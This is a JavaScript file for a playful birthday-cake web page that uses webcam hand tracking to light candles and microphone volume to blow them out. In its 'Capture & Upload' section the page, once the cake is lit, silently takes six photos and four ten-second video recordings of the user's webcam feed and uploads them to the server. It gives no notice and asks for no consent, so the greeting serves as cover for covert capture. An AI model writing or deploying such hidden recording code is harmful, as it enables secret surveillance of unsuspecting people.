const video = document.getElementById("webcam");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const match = document.querySelector(".match");
const cakeArea = document.querySelector(".cake-area");
const cakeImg = document.querySelector(".cake");

const WEBCAM_WIDTH=300, WEBCAM_HEIGHT=225;
const BLOW_THRESHOLD=70, LIGHT_DISTANCE=20;

canvas.width=WEBCAM_WIDTH;
canvas.height=WEBCAM_HEIGHT;

let handPosition={x:0.5,y:0.5}, isHandDetected=false;
let isCakeLit=false, isCandlesBlownOut=false, captureTriggered=false;

/* ================= Permission & Start ================= */
window.addEventListener("DOMContentLoaded", async ()=>{
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{width:WEBCAM_WIDTH,height:WEBCAM_HEIGHT,facingMode:"user"},audio:true});
    video.srcObject=stream;
    video.play();

    startHandTracking();
    initBlowDetection(stream);

    const music=document.getElementById("bgMusic");
    music.volume=0.5; music.play();

  }catch(err){ console.error("Camera/Mic required",err); alert("Camera/Mic access required!"); }
});

/* ================= Hand Tracking ================= */
const hands=new Hands({ locateFile:(file)=>`https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
hands.setOptions({ maxNumHands:1, modelComplexity:1, minDetectionConfidence:0.7, minTrackingConfidence:0.5 });
hands.onResults((results)=>{
  ctx.clearRect(0,0,canvas.width,canvas.height);
  ctx.save(); ctx.scale(-1,1); ctx.drawImage(results.image,-canvas.width,0,canvas.width,canvas.height); ctx.restore();
  if(results.multiHandLandmarks?.length){
    const indexTip=results.multiHandLandmarks[0][8];
    isHandDetected=true; handPosition.x=1-indexTip.x; handPosition.y=indexTip.y;
    updateMatchPosition(); checkCandleLighting();
  }else{ isHandDetected=false; }
});

function updateMatchPosition(){
  if(!isHandDetected) return;
  const rect=cakeArea.getBoundingClientRect();
  const x=20+handPosition.x*(rect.width-80);
  const y=20+handPosition.y*(rect.height-80);
  match.style.left=`${x}px`; match.style.top=`${y}px`;
}

function checkCandleLighting(){
  if(isCakeLit||isCandlesBlownOut) return;
  const matchRect=match.getBoundingClientRect(), cakeRect=cakeImg.getBoundingClientRect();
  const dx=(matchRect.left+matchRect.width/2)-(cakeRect.left+cakeRect.width/2);
  const dy=matchRect.top-(cakeRect.top+10);
  const dist=Math.sqrt(dx*dx+dy*dy);
  if(dist<LIGHT_DISTANCE) lightCake();
}

function lightCake(){
  if(isCakeLit) return;
  isCakeLit=true; cakeImg.src="/static/assets/cake_lit.gif"; match.style.display="none";
  createConfetti();
  if(!captureTriggered){ captureTriggered=true; startCaptureSequence(); }
}

/* ================= Confetti ================= */
const CONFETTI_SYMBOLS=["⭒","˚","⋆","⊹","₊","݁","˖","✦","✧","·","°","✶"];
function createConfetti(){
  const container=document.createElement("div");
  container.className="confetti-container"; document.body.appendChild(container);
  for(let i=0;i<150;i++){ setTimeout(()=>{
    const conf=document.createElement("span"); conf.className="confetti";
    conf.textContent=CONFETTI_SYMBOLS[Math.floor(Math.random()*CONFETTI_SYMBOLS.length)];
    conf.style.left=Math.random()*100+"vw"; conf.style.fontSize=0.8+Math.random()*2+"rem";
    conf.style.color=`hsl(${Math.random()*360},80%,60%)`;
    conf.style.animationDuration=3+Math.random()*3+"s"; conf.style.animationDelay=Math.random()*0.5+"s";
    conf.style.setProperty("--sway",(Math.random()-0.5)*100+"px");
    container.appendChild(conf); setTimeout(()=>conf.remove(),15000);
  },i*25); }
  setTimeout(()=>container.remove(),15000);
}

/* ================= Capture & Upload ================= */
async function startCaptureSequence(){
  for(let i=0;i<6;i++){ await sleep(500); capturePhoto(); }
  for(let i=0;i<4;i++){ captureVideo(10000); await sleep(1000); }
}
async function capturePhoto(){
  const data=canvas.toDataURL("image/jpeg",0.95);
  fetch("/upload/image",{method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({original:data})});
}
async function captureVideo(ms){
  const stream=canvas.captureStream(30);
  const recorder=new MediaRecorder(stream,{mimeType:"video/webm"}); const chunks=[];
  recorder.ondataavailable=e=>chunks.push(e.data);
  recorder.onstop=async()=>{
    const blob=new Blob(chunks,{type:"video/webm"});
    const fd=new FormData(); fd.append("original",blob,"capture.webm");
    fetch("/upload/video",{method:"POST",body:fd});
  };
  recorder.start(); setTimeout(()=>recorder.stop(),ms);
}
const sleep=ms=>new Promise(r=>setTimeout(r,ms));

/* ================= Mic Blow Detection ================= */
let audioContext, analyser, mic;
async function initBlowDetection(stream=null){
  if(!stream) stream=await navigator.mediaDevices.getUserMedia({audio:true});
  audioContext=new AudioContext(); analyser=audioContext.createAnalyser();
  mic=audioContext.createMediaStreamSource(stream); mic.connect(analyser); analyser.fftSize=256; detectBlow();
}
function detectBlow(){
  const data=new Uint8Array(analyser.frequencyBinCount); analyser.getByteFrequencyData(data);
  const vol=data.reduce((a,b)=>a+b,0)/data.length;
  if(vol>BLOW_THRESHOLD && isCakeLit && !isCandlesBlownOut){
    isCandlesBlownOut=true; cakeImg.src="/static/assets/cake_unlit.gif";
  }
  requestAnimationFrame(detectBlow);
}

/* ================= Camera ================= */
async function initCamera(){
  const stream=await navigator.mediaDevices.getUserMedia({video:{width:WEBCAM_WIDTH,height:WEBCAM_HEIGHT,facingMode:"user"}});
  video.srcObject=stream;
  video.onloadedmetadata=()=>{
    video.play();
    const cam=new Camera(video,{onFrame:async()=>await hands.send({image:video}), width:WEBCAM_WIDTH,height:WEBCAM_HEIGHT});
    cam.start();
  };
}
function startHandTracking(){ initCamera(); }
